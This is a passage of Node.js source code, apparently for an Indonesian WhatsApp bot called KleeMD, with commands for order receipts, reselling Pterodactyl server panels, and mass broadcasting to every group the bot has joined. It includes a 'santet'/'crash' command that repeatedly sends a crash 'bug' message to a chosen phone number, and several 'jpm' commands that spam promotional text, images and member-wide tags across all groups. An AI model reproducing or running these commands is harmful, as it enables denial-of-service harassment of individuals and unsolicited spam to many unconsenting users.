͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏ 
KleeMD adalah projek yang masih dalam tahap kembangkan.

bot WhatsApp yang saya buat menggunakan node.js, sehingga mampu dijalankan di berbagai jenis termasuk termux.

bot masih dalam tahapan pengembangan, jika ada saran atau komentar terkait Projek KleeMD saya bisa ke akun tiktok *@flow.falcon* disana.

*SCRIPT KLEEMD TIDAK PERAH DI JUALBELIKAN HARAP HATI-HATI DENGAN PENIPUAN*

Tunggu update terbarunya dari KleeMD di web resmi FlowFalcon
`
let messageContent = generateWAMessageFromContent(m.chat, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': tet
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./thumb.png')}, { upload: Klee.waUploadToServer})), 
                  'title': ``,
                  'gifPlayback': true,
                  'subtitle': global.namabot,
                  'hasMediaAttachment': false  
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                name: "cta_url",
                buttonParamsJson: "{\"display_text\":\"🌐 LINK DOWNLOAD\",\"url\":\"https://www.flowfalcon.xyz/#KleeMD\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                name: "cta_url",
                buttonParamsJson: "{\"display_text\":\"🌐 OWNER WEBSITE\",\"url\":\"https://www.flowfalcon.xyz/#\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
			  name: "cta_url",
			  ttonParamsJson: "{\"display_text\":\"👤 OWNER NUMBER\",\"url\":\"https:\\/\\/wa.me\\/19026088666\",\"webview_presentation\":null}",
									},],
              'messageParamsJson': "\0"
            })
          })
        }
      }
    }, {});

    return await Klee.relayMessage(m.chat, messageContent.message, {})
 }
break
case "done": {
if (!isOwner) return KleeReply(msg.owner)
if (!text) return m.reply(example("Nama Barang\n\n*Contoh :* Panel Unlimited"))
if (!text.split(",")) return m.reply(example("barang,harga\n\n*Contoh :* Panel Unlimited,2"))
var teks = `
╔═❍ *_Alhamdulillah Next Order⚡_*
╠📦BARANG :*${text}*
╠📆TANGGAL :${tanggal(Date.now())}
╠💫 STATUS : Done✅
╚═══❍𝗧𝗘𝗥𝗜𝗠𝗔 𝗞𝗔𝗦𝗜𝗛❍═══

⎙─➤bergaransi 1x (1x replace)
⎙─➤claim garansi wajib bawa bukti ss chat saat transaksi 

*TRIMAKASIH TELAH ORDER DI ${global.namaowner} 🤩*
⌕ █║▌║▌║ - ║▌║▌║█ ⌕`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [  {
                name: "cta_url",
                buttonParamsJson: "{\"display_text\":\"🌐 OWNER CHANEL\",\"url\":\"https://flowfalcon.xyz/\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
			  name: "cta_url",
			  ttonParamsJson: "{\"display_text\":\"👤 OWNER NUMBER\",\"url\":\"https:\\/\\/wa.me\\/19026088666\",\"webview_presentation\":null}",
									},]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await Klee.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "startjpm": {
if (!isOwner) return KleeReply(msg.owner)
var teksnya = await fs.readFileSync("./all/database/teksjpm.js").toString()
if (teksnya.length < 1) return m.reply("Teks Jpm Tidak Ditemukan, Silahkan Isi/Edit Teks Jpm Didalam Folder all/database")
var teks = `${teksnya}`
let total = 0
let allfetch = await Klee.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel})
for (let jid of usergc) {
try {
await Klee.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(4000)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpmhidetag": {
if (!isOwner) return KleeReply(msg.owner)
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await Klee.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan *Text* Ke *${usergc.length}* Grup`)
for (let jid of usergc) {
try {
await Klee.sendMessage(jid, {text: teks, mentions: allfetch[jid].participants.map(e => e.id)}, {quoted: qchanel})
total += 1
} catch (e) {
console.log(e)
}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpm": {
if (!isOwner) return KleeReply(msg.owner)
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await Klee.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
for (let jid of usergc) {
try {
await Klee.sendMessage(jid, {text: teks}, {quoted: qchanel})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpmpromosi": case "jpmpromo": case "jpm3": {
if (!isOwner) return KleeReply(msg.owner)
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await Klee.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
let teksnya = teks
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel})
for (let jid of usergc) {
try {
await Klee.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpm2": {
if (!isOwner) return KleeReply(msg.owner)
if (!text) return m.reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan balas/kirim foto"))
let image = await Klee.downloadAndSaveMediaMessage(qmsg)
let total = 0
let allfetch = await Klee.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Teks & Foto Ke *${usergc.length} Grup*`)
for (let jid of usergc) {
try {
Klee.sendMessage(jid, {image: await fs.readFileSync(image), caption: text, contextInfo: {forwardingScore: 1,
isForwarded: true}}, {quoted: qchanel})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await fs.unlinkSync(image)
m.reply(`Berhasil Mengirim Postingan Ke *${total} Grup*`)
}
break
case "jpmtesti": {
if (!isOwner) return KleeReply(msg.owner)
if (!text) return m.reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan balas/kirim foto"))
let image = await Klee.downloadAndSaveMediaMessage(qmsg)
if (global.idsaluran == "-") return m.reply('Isi Dulu ID Saluran Lu Di File Settings.js!')
let total = 0
let allfetch = await Klee.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Teks & Foto Ke *${usergc.length} Grup*`)
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: text
}), header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync(image)}, { upload: Klee.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel})
for (let jid of usergc) {
try {
await Klee.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await fs.unlinkSync(image)
m.reply(`Berhasil Mengirim Postingan Ke *${total} Grup*`)
}
break

// CPANEL MENU

case "addadmin": {
if (!text) return m.reply(example("username"))
if (!isOwner) return KleeReply(msg.owner)
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply("*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${user.created_at.split("T")[0]}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await Klee.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case "deladmin": {
if (!isOwner) return KleeReply(msg.owner)
if (!args[0]) return m.reply(example("id\n\nuntuk melihat id admin ketik *.listadmin*"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("ID Admin Tidak Ditemukan!")
m.reply(`Berhasil Menghapus Admin Panel *${capital(getid)}*`)
}
break
case "listadmin": {
if (!isOwner) return KleeReply(msg.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let totaladmin = 0
if (users.length < 1 ) return m.reply("Tidak Ada Admin Panel")
var teks = " *LIST ADMIN PANEL BOT⚡*\n\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
totaladmin += 1
teks += `\`📡ID User ${i.attributes.id}\`
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n\n`
})
teks += ` Total Admin : *${totaladmin} Admin*`
Klee.sendText(m.chat, teks, qtoko)
}
break
case "santet": case "crash": {
if (!isOwner) return KleeReply(msg.owner)
if (!text) return m.reply(example("6283XX,jumlahbug"))
if (!text.split(",")) return m.reply(example("6283XX,jumlahbug"))
var [target, jumlah] = text.split(",")
if (isNaN(target)) return m.reply("Target Tidak Valid!")
if (isNaN(jumlah)) return m.reply("Jumlah Tidak Valid!")
var org = target.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await Klee.onWhatsApp(org.split('@')[0])
if (!check[0].exists) return m.reply("Target Tidak Terdaftar Di WhatsApp")
m.reply("Memproses Pengiriman Bug . . .")
var total = Number(jumlah) + 10
for (let i = 0; i < total; i++) {
if (i == 10) m.reply(`Berhasil Memproses, Bug Sedang Dikirim Ke ${org.split("@")[0]}`)
MessageBug(`${org}`)
await sleep(2000)
}
}
break
case "panel": case "buatpanel": {
if (!isOwner && !jangan) return KleeReply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("nama"))
global.panel = [text.toLowerCase()]
let teksnya = "Silahkan Pilih Ram Server Panel"
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunli" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gb" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gb" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gb" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gb" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gb" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gb" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gb" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gb" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gb" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await Klee.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "cp1gb": case "cp2gb": case "cp3gb": case "cp4gb": case "cp5gb": case "cp6gb": case "cp7gb": case "cp8gb": case "cp9gb": case "cpunli": {
if (!isOwner && !jangan) return KleeReply(msg.owner)
if (global.panel == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner && !jangan) return KleeReply(msg.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel📦*
*silahkan login ke server kamu sendiri*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await Klee.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.panel = null
}
break
case "listpanel": case "listp": case "listserver": {
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!isOwner) return KleeReply(msg.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "*LIST SERVER PANEL BOT⚡*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`📡ID Server ${s.id}\`
* Nama Server : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await Klee.sendMessage(m.chat, { text: messageText }, { quoted: qtoko })
}
break
case "delpanel": case "hapuspanel": {
if (!isOwner) return KleeReply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
